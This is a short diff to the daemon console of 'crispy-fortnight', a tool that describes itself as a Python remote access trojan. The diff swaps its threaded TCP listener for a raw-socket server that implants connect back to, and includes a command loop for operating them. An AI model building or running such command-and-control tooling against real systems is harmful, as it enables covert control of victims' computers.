@@ -3,11 +3,10 @@ import logging
 import ConfigParser
 import threading
 
-from crispy.network.handler import ThreadedTCPRequestHandler
-from crispy.lib.server import ThreadedTCPServer
 from crispy.lib.cli import CrispyCLI
+from crispy.network.server import RawSocketServer
 from crispy import __version__
-    
+
 def main():
     argp = argparse.ArgumentParser(description="crispy-fortnight (Python RAT) daemon console. All implants will do a reverse connection back to this server.",
                                    epilog="***Do NOT use this for nefarious purposes!***", 
@@ -40,26 +39,23 @@ def main():
 			filename="crispy.log",
 			format="%(asctime)-15s - %(levelname)-7s - %(module)-8s - %(message)s",
 			level=loglevel)
-
+    
     config = ConfigParser.ConfigParser()
     config.read(args.config_file)
     
     host = config.get("DAEMON", "host")
     port = config.getint("DAEMON", "port")
 
-    srv = ThreadedTCPServer((host, port), ThreadedTCPRequestHandler)
-    logging.info("Started server on {}:{}".format(srv.server_address[0], srv.server_address[1]))
-
     try:
-        tsrv = threading.Thread(target=srv.serve_forever)
-	tsrv.daemon = True
-        tsrv.start()
+        tsrv = RawSocketServer(host, port)
+        logging.info("Started server on {}:{}".format(host, port))
 	logging.info("Listening for connections, press <Ctrl-C> to quit")
-	CrispyCLI(srv).cmdloop()
+        tsrv.daemon = True
+        tsrv.start()
+        CrispyCLI(tsrv).cmdloop()
     except KeyboardInterrupt:
 	logging.warning("Ctrl-C received... shutting down crispyd")
-	srv.shutdown()
-        srv.server_close()
+        tsrv.shutdown()
 
 if __name__ == "__main__":
     main()
